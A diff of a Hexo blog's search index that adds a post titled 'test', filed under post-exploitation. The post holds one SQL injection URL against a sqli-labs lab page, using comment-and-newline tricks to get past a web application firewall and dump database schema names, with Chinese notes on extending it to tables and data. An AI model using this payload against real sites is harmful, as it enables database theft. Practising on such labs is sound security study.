@@ -303,6 +303,19 @@
       </tags>
   </entry>
   <entry>
+    <title>test</title>
+    <url>/2020/03/29/test/</url>
+    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://192.168.222.130:86/Less-1/?id=-2%27%20union%20--+X%0a%20select%201,2,(select--+x%0agroup_concat(schema_name)--+x%0afrom--+x%0ainformation_schema.schemata)--+</span><br><span class="line"><span class="comment">#方法和前面的思路一样，换行处理</span></span><br><span class="line"><span class="comment">#爆表，爆字段和数据类似</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>后渗透</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>绕过安全狗</title>
     <url>/2020/03/29/%E6%9C%AC%E5%9C%B0%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97%E5%B0%9D%E8%AF%95/</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
